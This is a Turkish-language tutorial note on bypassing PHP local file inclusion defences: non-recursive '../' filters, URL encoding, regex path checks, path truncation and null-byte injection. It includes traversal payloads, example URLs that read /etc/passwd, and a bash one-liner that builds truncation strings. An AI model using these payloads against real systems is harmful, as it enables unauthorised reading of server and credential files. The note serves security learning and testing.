---
glightbox: true
icon: material/circle-small
---

# Basic Bypasses

## Non-Recursive Path Traversal Filters

Geliştiriciler, LFI saldırısını engellemek için aşağıdaki gibi bir kod kullanabilir:

```php
$language = str_replace('../', '', $_GET['language']);
```

Bu kod, GET parametresinde bulunan `../` ifadelerini temizlemektedir. Ancak bu işlem yeterli değildir. Bundan kaçınmak için aşağıdaki ifadeler kullanılabilir:

* [x] `....//`
* [x] `..././`
* [x] `....\/`
* [x] `....////`

Bu şekilde, ifade (`../`) silindikten sonra bile aynı ifade oluşturulmuş olur.

## Encoding

Bazı web siteleri nokta (`.`) ve eğik çizgi (`/`) gibi ifadelerin URL kısmında kullanılmasını engelleyebilir. Bu engeli aşmak için ifade (`../`) URL kodlaması ile değiştirilebilir (`%2e%2e%2f`).

* [x] Örneğin URL şu şekilde gözükebilir:

```text
http://SERVER_IP_ADDRESS:PORT/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

## Approved Paths

Bazı web uygulamaları RegEx kullanarak, dosyaların belirli bir dizin altında olup olmadığını doğrulayabilir:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Web uygulamasının RegEx kontrolünde hangi dizini hesaba kattığını çeşitli yöntemlerle (fuzzing vs.) öğrendikten sonra, bu korumayı aşmak için LFI dizemizi bu dizin ile başlatabiliriz.

* [x] Örneğin URL şu şekilde gözükebilir:

```text
http://SERVER_IP_ADDRESS:PORT/index.php?language=./languages/../../../../etc/passwd
```

## Appended Extension

Sitenin kaynak kodunda aşağıdaki gibi bir satır olsun:

```php
include($_GET['language'] . ".php");
```

Bu durumda, bahsedilen LFI yöntemleri (örneğin `../../../etc/passwd`) işe yaramayacaktır. Çünkü GET parametresini ilgili şekilde verdiğimizde, mevcut olmayan bir dosya yolu (`../../../etc/passwd.php`) talep etmiş oluruz.

Bu korumayı aşmak için, eski PHP sürümlerini etkileyen bazı saldırı yöntemleri kullanılabilir.

### Path Truncation

Eski PHP sürümlerinde bir dizenin maksimum uzunluğu 4096 karakter olarak belirlenmiştir (32-bit sistem sınırlaması). Eğer 4096 karakterden daha uzun bir dize tanımlanırsa, bu sayının ötesindeki karakterler kırpılır.

Buna ek olarak, aşağıdaki durumlarda da belirtilen kırpma işlemleri gerçekleşir:

* `/etc/hosts/.` --> `/etc/hosts`
* `///etc/hosts` --> `/etc/hosts`
* `/etc/./hosts` --> `/etc/hosts`

Bahsedilen bu PHP sınırlamaları birlikte kullanıldığında, istenilen yolu elde etmek için çok uzun dizeler oluşturabiliriz. 4096 karakter sınırına ulaştığımızda, geride kalan uzantı (örneğin `.php`) kırpılır ve istediğimiz yolu elde etmiş oluruz.

!!! warning "Non-Existing Directory"

    Burada bahsedilen tekniğin işe yaraması için, LFI dizesi, sunucuda mevcut olmayan bir dizin ifadesi ile başlamalıdır.

Oldukça uzun bir LFI dizesi oluşturmak için aşağıdaki komutu kullanabiliriz:

```bash
echo -n "NonExistingDirectory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

!!! info "4096"

    Verilen komutta, `./` ifadesi 2048 kere tekrarlanarak 4096 karakter elde edilmiştir.

### Null Bytes

Eski PHP sürümlerinde Null Byte Injection zafiyeti de kullanılabilir. Bunun için ilgili dizenin sonuna Null karakteri (`%00`) eklenerek, bu karakterden sonraki ifadelerin geçersiz olması sağlanabilir.

* [x] Örneğin URL şu şekilde gözükebilir:

```text
http://SERVER_IP_ADDRESS:PORT/index.php?language=./languages/../../../../etc/passwd%00
```
